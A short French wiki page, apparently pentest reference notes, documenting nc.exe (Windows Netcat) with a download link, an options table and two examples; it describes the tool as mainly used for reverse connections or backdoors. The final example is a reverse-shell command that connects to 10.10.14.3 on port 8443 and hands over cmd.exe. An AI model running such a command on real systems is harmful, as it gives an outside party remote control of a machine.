---
title: nc
description: Nc est la version disponible sur Windows de Netcat, Netcat est un utilitaire permettant d'ouvrir des connexions réseau, cet outil peut être utilisé pour de nombreux usages
published: true
date: 2025-05-04T14:55:39.016Z
tags: outil, windows
editor: markdown
dateCreated: 2024-07-12T16:56:06.120Z
---

# Introduction

Nc est la version disponible sur Windows de Netcat, Netcat est un puissant outil permetttant l'écoute de ports ou encore l'ouverture de connexion réseau, cet outil est principalement utilisé pour se connecter à une une connexion inverse ou backdoor, mais il a d'autres nombreux usages.

> Nc est disponible au téléchargement ici: https://github.com/int0x33/nc.exe/
> {.is-info}

# Syntaxe

`nc.exe [ip/port/les deux] [options]`

# Options

| Option          | Description                                                         |
| --------------- | ------------------------------------------------------------------- |
| `-l`            | Mode écoute (listen), attendre une connexion entrante               |
| `-v`            | Mode verbose, affiche des informations supplémentaires              |
| `-p [port]`     | Spécifie un port d'écoute et aussi là où la connexion est transmise |
| `-e [commande]` | Spécifie la commande à éxectuer lorsqu'une transmission est établie |

# Exemples

Écoute sur sur le port 8080

`nc.exe -l -p 8080`

Envoi une connexion vers l'ip 10.10.14.3 sur le port 8443 qui éxecutera "cmd.exe" lors de l'établissement de la connexion

`nc.exe 10.10.14.3 8443 -e cmd.exe`
